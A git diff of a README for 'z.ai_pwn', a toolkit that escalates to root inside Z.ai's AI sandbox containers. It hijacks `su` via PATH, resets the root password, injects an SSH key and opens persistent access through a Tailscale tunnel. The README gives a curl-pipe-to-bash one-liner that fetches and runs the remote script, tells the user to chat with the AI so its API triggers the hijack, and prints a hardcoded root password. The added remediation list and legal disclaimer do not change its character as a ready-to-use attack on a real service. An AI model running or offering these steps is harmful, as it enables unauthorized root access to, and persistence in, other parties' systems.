@@ -1,34 +1,41 @@
 # z.ai_pwn
 
-> Privilege escalation & persistence toolkit for Z.ai containers.
+> Security research tool — container escape PoC for Z.ai sandbox environments.
 
-Exploits a `su` binary hijack to escalate from unprivileged user to root, then sets up persistent SSH access via Tailscale tunnel.
+## Purpose
+
+This project demonstrates a **PATH hijack privilege escalation** vulnerability in containerized AI sandbox environments. It was developed as part of responsible security research to highlight weaknesses in container isolation and privilege separation.
+
+The goal is to help platform maintainers identify and fix these classes of vulnerabilities before they are exploited maliciously.
+
+## Attack Vector
+
+| Stage | Technique | MITRE ATT&CK |
+|-------|-----------|---------------|
+| Initial Access | Unprivileged shell in container | T1059.004 |
+| Privilege Escalation | PATH hijack of `su` binary | T1574.007 |
+| Credential Access | Password reset via `chpasswd` | T1098 |
+| Persistence | SSH key injection + Tailscale tunnel | T1098.004, T1572 |
 
 ## How It Works
 
-1. **PATH hijack** — drops a fake `su` into `/usr/local/bin/` that runs before the real `/usr/bin/su`
-2. **Credential reset** — when root (or cron/service) invokes `su`, the fake binary resets the root password and injects your SSH key
-3. **SSH server** — installs and starts `openssh-server`
-4. **Tailscale tunnel** — sets up a userspace Tailscale node so you can reach the container from anywhere
-
-## Requirements
-
-- Unprivileged shell inside the target container
-- Container has internet access (for `apt-get` and Tailscale install)
-- `/usr/local/bin` is in `$PATH` before `/usr/bin`
+1. Places a wrapper script in `/usr/local/bin/su` (higher PATH priority than `/usr/bin/su`)
+2. When a privileged process calls `su`, the wrapper intercepts it and:
+   - Resets the root password
+   - Injects an SSH public key into `authorized_keys`
+3. Establishes persistent remote access via SSH + Tailscale
 
 ## Quick Start
-
-One-liner — download and run directly inside the container:
 
 ```bash
 curl -sL https://raw.githubusercontent.com/Mffff4/z.ai_pwn/main/pwn.sh | bash -s '<your-ssh-public-key>'
 ```
 
+Then send any message in the Z.ai chat to trigger the API to call `su`.
+
 ## Usage
 
 ```bash
-# Or copy the script manually, then:
 chmod +x pwn.sh
 ./pwn.sh '<your-ssh-public-key>'
 ```
@@ -39,40 +46,50 @@ chmod +x pwn.sh
 ./pwn.sh 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... user@host'
 ```
 
-The script will wait up to 60 seconds for a privileged process to call `su`. Once triggered:
+**Expected output:**
 
 ```
-[+] PWNED! Got root
+[*] Step 1: Create fake su binary
+[!] Now go to the Z.ai chat and type something...
+[*] Step 2: Waiting for API to call su...
+[+] PWNED! Hijack triggered
+[*] Step 3: Install SSH server
+[*] Step 4: Install Tailscale
+[*] Step 5: Start Tailscale (userspace mode)
+[*] Step 6: Get Tailscale login URL
+
+========================================
+[+] DONE!
 [+] Root password: 12341234
 [+] SSH key installed
 
-[*] Connect via Tailscale:
-    URL: https://login.tailscale.com/...
-    After auth: ssh root@<tailscale-ip>
+[*] Tailscale login URL:
+    https://login.tailscale.com/a/...
+
+[*] After auth: ssh root@<tailscale-ip>
+========================================
 ```
 
-## Connect
+## Remediation
 
-1. Open the Tailscale login URL printed by the script
-2. Authenticate in your browser
-3. SSH into the container:
+If you are a platform maintainer, consider the following mitigations:
 
-```bash
-ssh root@<tailscale-ip>
-```
-
-Or use the fallback password (`12341234`) if SSH keys aren't working.
+- **Restrict PATH** — ensure `/usr/local/bin` is not writable by unprivileged users, or place it after system directories in PATH
+- **Use absolute paths** — call `/usr/bin/su` explicitly in scripts and services
+- **Drop capabilities** — run containers with `--cap-drop=ALL` and only add required capabilities
+- **Read-only filesystem** — mount `/usr/local/bin` as read-only
+- **Monitor file changes** — use inotify/auditd to detect new binaries in PATH directories
 
 ## Legal Disclaimer
 
-> **This tool is provided for authorized security research, penetration testing, and CTF competitions only.**
+> **This tool is provided strictly for authorized security research, penetration testing, and educational purposes.**
 
-- You may **only** use this tool on systems you own or have **explicit written permission** to test.
-- Unauthorized access to computer systems is a criminal offense in most jurisdictions (e.g., CFAA in the US, Computer Misuse Act in the UK).
-- The author assumes **no liability** for misuse of this tool. You are solely responsible for your actions.
-- By using this software, you agree that you have obtained proper authorization from the system owner.
+- You may **only** use this tool on systems you own or have **explicit written authorization** to test.
+- Unauthorized access to computer systems is a criminal offense under CFAA (US), Computer Misuse Act (UK), and equivalent laws worldwide.
+- The author assumes **no liability** for any misuse. You are solely responsible for your actions.
+- By using this software, you agree to comply with all applicable laws and that you have obtained proper authorization.
 
-If you believe this tool is being used maliciously, please see [SECURITY.md](SECURITY.md).
+See [SECURITY.md](SECURITY.md) for full security policy and legal references.
 
 ## License
 
